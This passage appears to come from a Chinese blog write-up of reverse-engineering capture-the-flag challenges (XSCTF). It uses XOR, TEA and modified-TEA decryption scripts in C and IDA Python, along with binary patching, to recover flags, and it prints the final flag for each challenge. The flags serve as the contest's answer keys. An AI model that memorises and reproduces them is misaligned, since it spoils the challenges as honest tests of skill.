class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (var c = <span class="number">0</span>; c &lt; <span class="number">128</span>; c += <span class="number">1</span>) &#123;</span><br><span class="line">        temp2 = _H4H4H4H4(temp1 ^ c, key[<span class="string">&#x27;charCodeAt&#x27;</span>]([i / <span class="number">0x2</span> % key[<span class="string">&#x27;length&#x27;</span>]]),rand_n)</span><br><span class="line">        <span class="keyword">if</span>(enc[i+<span class="number">1</span>] == temp2)&#123;</span><br><span class="line">            flag[<span class="string">&#x27;push&#x27;</span>](c)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var flagString = String.fromCharCode(...flag);</span><br><span class="line">console.<span class="built_in">log</span>(flagString);</span><br></pre></td></tr></table></figure><p>得到<code>UR_R341Ly_900d_47_Obfu_ur_Newn3W</code></p><p>所以flag为:<code>XSCTF&#123;UR_R341Ly_900d_47_Obfu_ur_Newn3W&#125;</code></p><h2 id="题目2-福莱阁佳茶">题目2-福莱阁佳茶</h2><p>打开一看114514秒的等待,反手一个patch掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151222003.png" alt="image-20231016151222003" style="zoom:50%;" /><p>这样只需要等2秒~~~</p><p>查找字符串发现了可疑字符串,进行交叉引用查找,找到了相关函数,尝试编写解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/*char str[] = &quot;]VFQC~Cpkk|Zm4a6Z1kaZv66n:x&quot;;</span></span><br><span class="line"><span class="comment">    // puts(str);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; sizeof(str) / sizeof(str[0]); ++i) &#123;</span></span><br><span class="line"><span class="comment">        putchar(str[i] ^ 5);</span></span><br><span class="line"><span class="comment">        //结果:XSCTF&#123;Funny_h1d3_4nd_s33k?&#125;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;@bm#zlv#ejmg#wkf#eobd&lt;&quot;</span>;</span><br><span class="line">    <span class="comment">// puts(str);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(str) / <span class="keyword">sizeof</span>(str[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(str[i] ^ <span class="number">3</span>);</span><br><span class="line">        <span class="comment">//结果:Can you find the flag?</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是第一个flag并不是真正的flag,还需要继续找.</p><p>发现这个函数里还有问题:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151740260.png" alt="image-20231016151740260" style="zoom:50%;" /><p>太乱了,直接动调,在图中位置下断点,看看运行到这里会发生啥,直接调试:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151828305.png" alt="image-20231016151828305" style="zoom:50%;" /><p>停在了这里,双击看看Str现在发生了什么变化(说实话我也懒得分析这函数啥时候调用…Orz):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151914687.png" alt="image-20231016151914687" style="zoom:50%;" /><p>发现和之前跑出来的flag不一样,尝试提交发现确实如此,这才是正确的flag.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016151955195.png" alt="image-20231016151955195" style="zoom:50%;" /><p>这里也能看出代码对flag的后5个字符(不包括<code>'&#125;'</code>)进行了进一步处理…</p><p><code>XSCTF&#123;Funny_h1d3_4nd_HId3!&#125;</code></p><h2 id="题目3-lotery-shop">题目3-lotery_shop</h2><p>这个题,真就是把flag藏进去了是吧,除了flag的加密和提示字符串有关,其他的和彩票系统一点关系都没有.</p><p>分析main函数中的一堆,一个菜单,还有一些随机数生成和检查的相关代码,我倒是了个清楚:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016152435565.png" alt="image-20231016152435565" style="zoom:50%;" /><p>实际上,再仔细对每一个函数分析,就能发现猫腻实际上在程序初始化处理的那个函数中,这个函数原本的职责是用来输出初始的提示信息,并初始化随机数等:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016152541507.png" alt="image-20231016152541507" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016152554693.png" alt="image-20231016152554693" style="zoom:50%;" /><p>我们可以看到,第31行起,进行了彩票系统相关的处理,例如随机数生成的,但是13行到30行就有猫腻,莫名其妙有一些字符操作.</p><p>再看第13行发现其实是调用了malloc函数分配了一段内存.</p><p>但是这代码好像没找到有free()函数的调用哈哈哈,可能有问题(也可能我没找到)</p><p>那么盲猜这就是flag,动调没出来,不知道是缓冲有问题还是咋的,我直接手动写代码(复制粘贴):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a1[]=<span class="string">&quot;Sloth&#x27;s lottery shop is open!&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a2[]=<span class="string">&quot;You&#x27;re our first customer!&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a3[]=<span class="string">&quot;We will give you a free lottery ticket, the number is: &quot;</span>;</span><br><span class="line">    <span class="type">char</span> a4[]=<span class="string">&quot;Please enter your choice &#123;1-5&#125;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a5[]=<span class="string">&quot;1.buy a lottery ticket&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a6[]=<span class="string">&quot;2.Check to see if you won&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a7[]=<span class="string">&quot;3.join us&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a8[]=<span class="string">&quot;4.Take a sneak peek at the flag&quot;</span>;</span><br><span class="line">    <span class="type">char</span> a9[]=<span class="string">&quot;5.exit&quot;</span>;</span><br><span class="line">    <span class="type">int</span> a10,a11,a12;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> malloced_str[<span class="number">1000</span>];</span><br><span class="line">    malloced_str[<span class="number">9</span>] = *a5;</span><br><span class="line">    malloced_str[<span class="number">2</span>] = malloced_str[<span class="number">9</span>];</span><br><span class="line">    malloced_str[<span class="number">1</span>] = *(<span class="type">char</span> *)(a1 + <span class="number">10</span>) - <span class="number">12</span>;</span><br><span class="line">    malloced_str[<span class="number">10</span>] = *(<span class="type">char</span> *)(a3 + <span class="number">5</span>) - <span class="number">56</span>;</span><br><span class="line">    malloced_str[<span class="number">7</span>] = *(<span class="type">char</span> *)(a6 + <span class="number">15</span>) - <span class="number">10</span>;</span><br><span class="line">    malloced_str[<span class="number">13</span>] = <span class="built_in">toupper</span>((<span class="type">char</span>)(*(<span class="type">char</span> *)(a8 + <span class="number">3</span>) + <span class="number">3</span>));</span><br><span class="line">    malloced_str[<span class="number">3</span>] = *(<span class="type">char</span> *)(a2 + <span class="number">1</span>) + <span class="number">4</span>;</span><br><span class="line">    malloced_str[<span class="number">11</span>] = <span class="built_in">toupper</span>((<span class="type">char</span>)(*(<span class="type">char</span> *)(a7 + <span class="number">7</span>) - <span class="number">14</span>));</span><br><span class="line">    malloced_str[<span class="number">4</span>] = malloced_str[<span class="number">7</span>];</span><br><span class="line">    *malloced_str = <span class="built_in">tolower</span>((<span class="type">char</span>)(*a9 + <span class="number">31</span>));</span><br><span class="line">    malloced_str[<span class="number">8</span>] = <span class="built_in">toupper</span>(*(<span class="type">char</span> *)(a8 + <span class="number">27</span>));</span><br><span class="line">    malloced_str[<span class="number">5</span>] = <span class="built_in">toupper</span>((<span class="type">char</span>)(*(<span class="type">char</span> *)(a4 + <span class="number">13</span>) - <span class="number">16</span>));</span><br><span class="line">    malloced_str[<span class="number">6</span>] = malloced_str[<span class="number">3</span>];</span><br><span class="line">    malloced_str[<span class="number">12</span>] = a5[<span class="number">6</span>] - <span class="number">39</span>;</span><br><span class="line">    <span class="built_in">puts</span>(malloced_str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153249608.png" alt="image-20231016153249608" style="zoom:50%;" /><p>得到flag:</p><p><code>XSCTF&#123;th1s_Is_F14G:D&#125;</code></p><h2 id="题目4-pytea">题目4-pytea</h2><p>用DIE查看,发现是用pyinstaller打包的程序:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153531900.png" alt="image-20231016153531900" style="zoom: 50%;" /><p>使用pyinstxtractor进行解包,然后丢到pyc在线反编译网站:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153643512.png" alt="image-20231016153643512" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016153736267.png" alt="image-20231016153736267" style="zoom:50%;" /><p>提取下来,分析,就是一个纯TEA加密,我们套脚本,不过我对于TEA不太熟,先搞一波试试水,一个个的打印看看,因为解密出来貌似有一些非可见字符.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>;  <span class="comment">// 注意sum也是32位无符号整型</span></span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">uint32_t</span> v[] = &#123;</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0x93178965</span>L, <span class="number">1446958341</span>, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">0xD103A1FC</span>L, <span class="number">0xEA41C188</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">2119578006</span>, <span class="number">1735799975</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">998166288</span>,</span><br><span class="line">            <span class="number">1533730069</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF0B370A5</span>L, <span class="number">0x8F4854A9</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0x93178965</span>L, <span class="number">1446958341</span>, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">0xE7792E99</span>L, <span class="number">1516481470</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xF0B370A5</span>L, <span class="number">0x8F4854A9</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xB47C2782</span>L,</span><br><span class="line">            <span class="number">0x85FFC9D3</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">1256740478</span>, <span class="number">0xE4E1C8F7</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xD103A1FC</span>L, <span class="number">0xEA41C188</span>L, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">1565438833</span>, <span class="number">0xA0F1C10B</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xC2F51E4D</span>L, <span class="number">1371444109</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF0B370A5</span>L,</span><br><span class="line">            <span class="number">0x8F4854A9</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xFE42A23C</span>L, <span class="number">0x8D5DBC7C</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0x9EC5E417</span>L, <span class="number">401575738</span>, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">998166288</span>, <span class="number">1533730069</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xD103A1FC</span>L, <span class="number">0xEA41C188</span>L, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">1259602668</span>,</span><br><span class="line">            <span class="number">877012692</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">1565438833</span>, <span class="number">0xA0F1C10B</span>L,</span><br><span class="line">            <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF0B370A5</span>L, <span class="number">0x8F4854A9</span>L, <span class="number">0xFFB5CB6D</span>L,</span><br><span class="line">            <span class="number">498681769</span>, <span class="number">0x93178965</span>L, <span class="number">1446958341</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>,</span><br><span class="line">            <span class="number">0xB2C8C968</span>L, <span class="number">285984659</span>, <span class="number">0xFFB5CB6D</span>L, <span class="number">498681769</span>, <span class="number">0xF59A7B5D</span>L,</span><br><span class="line">            <span class="number">0xC520BE45</span>L</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">83</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">104</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">96</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        decrypt(&amp;v[i], k);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>, v[i], v[i + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里贴的最终的脚本,实际没影响,直接全输出就行,将空白删掉就是flag:</p><p><code>T1m3_T0_DR1NK_CE31ON_Tea</code></p><p>即</p><p><code>XSCTF&#123;T1m3_T0_DR1NK_CE31ON_Tea&#125;</code></p><h2 id="题目5-奇怪的光之翼">题目5-奇怪的光之翼</h2><p>这个题是除了JSNEWNEW外我做的最折磨的一道题…魔改TEA是吧…</p><p>密码爷们看了都说好!</p><p>分析发现,前面有个假加密,而且不patch的话,程序势必走向这个错误的分支,所以真正的flag在else分支中:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016155905931.png" alt="image-20231016155905931" style="zoom:50%;" /><p>继续分析正确的分支:</p><p>题目中有两个SMC(代码自修改技术),不解释,直接用IDA Python进行patch掉,注意patch后,如果需要动调,还需要把原来运行SMC的代码patch掉.</p><p>这里已经patch好了,只放IDA Python的脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一个SMC</span></span><br><span class="line">adr = <span class="number">0x0404080</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">    temp = get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    temp = <span class="built_in">int</span>.from_bytes(temp,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    temp = temp ^ <span class="number">0x55</span></span><br><span class="line">    patch_byte(adr+i,temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二个SMC</span></span><br><span class="line">adr = <span class="number">0x0404120</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">254</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    temp = get_bytes(adr+i,<span class="number">1</span>)</span><br><span class="line">    temp2 = get_bytes(adr+i-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">int</span>.from_bytes(temp,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    temp2 = <span class="built_in">int</span>.from_bytes(temp2,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    temp = temp ^ temp2</span><br><span class="line">    patch_byte(adr+i-<span class="number">1</span>,temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><p>关键函数在这里:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016160203949.png" alt="image-20231016160203949" style="zoom:50%;" /><p>注释就是已经分析出来的结果,我们写代码就行.</p><p>注意:</p><p>1.第一个加密只进行了1轮,并且v[0]和v[1]的加密顺序需要上下调换(被这个坑卡了好久,一度怀疑自己…)!</p><p>1.第一个加密的delta不是默认值!</p><p>2.第二个加密进行了33轮而不是32轮!</p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">33</span>; <span class="comment">// 注意是33轮</span></span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 注意是33轮</span></span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt2</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xda740da0</span>; <span class="comment">// delta不是默认值</span></span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">1</span>; <span class="comment">// 只进行一次</span></span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 原来的TEA代码中这两行上下需要进行互换</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    